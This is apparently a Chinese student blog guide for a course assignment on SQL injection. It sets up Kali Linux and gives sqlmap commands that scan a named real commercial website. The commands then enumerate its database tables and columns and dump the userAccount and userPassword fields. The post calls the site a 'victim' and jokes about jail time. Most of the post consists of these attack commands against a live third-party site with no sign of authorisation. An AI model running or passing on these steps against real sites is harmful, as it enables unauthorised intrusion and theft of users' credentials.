---
title: 计算机导论大作业(SQL注入)指南
date: 2021-11-20
categories:
 - 其他
keys: 
 - 'dbd6d04a498427695f9502ff63021fc9' 
---
## **一、准备工作**
如果只在学校的电脑上耍可以跳过；
否则的话
需要VM Ware或者VirtualBox软件创建虚拟机。
安装Kali Linux虚拟机
这个教程很详细
[最新超详细虚拟机VMware安装Kali Linux](https://blog.csdn.net/qq_40950957/article/details/80468030)

其实虚拟机迟早都得学，都得用，我建议早点在自己电脑上装上
## **二、打开VM Ware 和 Kali linux**
俗话说，Kali用的好，牢饭吃到老，终于可以开始你的SQL注入之旅了。
## **三、打开Sqlmap工具**
在这儿
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212215715375.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
## **四、随机找一个受害者（网站）**
网站老师给的PPT里有，这里用最后一个做示范
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212215852493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
## **五、进行迫害**
*1、先看看能不能进行sql注入（扫描）*

PS：让你输入Y/n的时候一律输Y就完了（Y用小写也是可以的）；
     	-u后面的是自己选的网址
```bash
sqlmap -u http://www.17tour.com.tw/newsCat.php?cat=1
```
一切正常的话大概会进到这块地方；
说明这个网站是可以的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212220452323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
*2、爆表名*

```bash
sqlmap -u http://www.17tour.com.tw/newsCat.php?cat=1 –tables
```

一切正常的话....
就能看到两个database（数据库）
这里只贴了一个
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212221208549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
找到那个类似于user这样的数据表，记下它在哪个数据库下面，实例中是 tourtw_new17tour 这个数据库
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212221246590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
*3、爆列名*

user是你刚刚找到的表；名字可能类似user不一定就是user
```bash
sqlmap -u http://www.17tour.com.tw/newsCat.php?cat=1 --columns -T "users"
```
一切顺利的话...
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212221623352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
*4、就可以看到我们的目标了*

就是那个userAccount 和userPassword
记得类比为自己的（小声bb）

```bash
sqlmap -u http://www.17tour.com.tw/newsCat.php?cat=1 --dump -C "userAccount,userPassword"
```
最终结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201212221843933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsYW5Db3JuXzAy,size_16,color_FFFFFF,t_70)
## **六、作业上传**
